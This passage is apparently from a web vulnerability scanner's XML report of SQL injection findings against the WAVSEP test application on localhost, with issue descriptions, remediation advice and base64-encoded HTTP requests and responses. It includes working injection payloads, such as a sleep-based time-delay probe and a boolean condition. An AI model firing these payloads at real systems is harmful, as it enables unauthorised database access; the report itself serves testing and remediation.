zdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTM3DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU0OjU4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJyd0ZXh0dmFsdWUnJycgYXQgbGluZSAxCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTAzLUluamVjdGlvbkluQ2FsYy1TdHJpbmctQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3A/dXNlcm5hbWU9dGV4dHZhbHVlJycgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU0OjU4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpObyBNYXRjaC4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTAzLUluamVjdGlvbkluQ2FsYy1TdHJpbmctQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3A/dXNlcm5hbWU9dGV4dHZhbHVlJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYicgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjE4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNTkNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMyAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIHVzZXJzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5102204612131781632</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case04-InjectionInUpdate-String-CommandInjection-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case04-InjectionInUpdate-String-CommandInjection-With200Errors.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTA0LUluamVjdGlvbkluVXBkYXRlLVN0cmluZy1Db21tYW5kSW5qZWN0aW9uLVdpdGgyMDBFcnJvcnMuanNwP21zZz10ZXh0dmFsdWUnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTQ3DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU0OjU5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNCAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCkV4Y2VwdGlvbiBkZXRhaWxzOiBqYXZhLnNxbC5TUUxTeW50YXhFcnJvckV4Y2VwdGlvbjogWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnJ3RleHR2YWx1ZScnIFdIRVJFIG1zZ2lkPTEnIGF0IGxpbmUgMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTA0LUluamVjdGlvbkluVXBkYXRlLVN0cmluZy1Db21tYW5kSW5qZWN0aW9uLVdpdGgyMDBFcnJvcnMuanNwP21zZz10ZXh0dmFsdWUnJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU0OjU5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzYNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNCAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClF1ZXJ5IGV4ZWN1dGVkCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6950814523556448256</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case11-InjectionInView-Date-PermissionBypass-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case11-InjectionInView-Date-PermissionBypass-With200Errors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the transactionDate parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>25622920 or 4190=04190</b> was submitted in the transactionDate parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTExLUluamVjdGlvbkluVmlldy1EYXRlLVBlcm1pc3Npb25CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3A/dHJhbnNhY3Rpb25EYXRlPTIwMTAtMDEtMDEnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTYxDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTEgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICcnMjAxMC0wMS0wMScnIEFORCB1c2VySWQ9MScgYXQgbGluZSAxCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTExLUluamVjdGlvbkluVmlldy1EYXRlLVBlcm1pc3Npb25CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3A/dHJhbnNhY3Rpb25EYXRlPTIwMTAtMDEtMDEnJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0l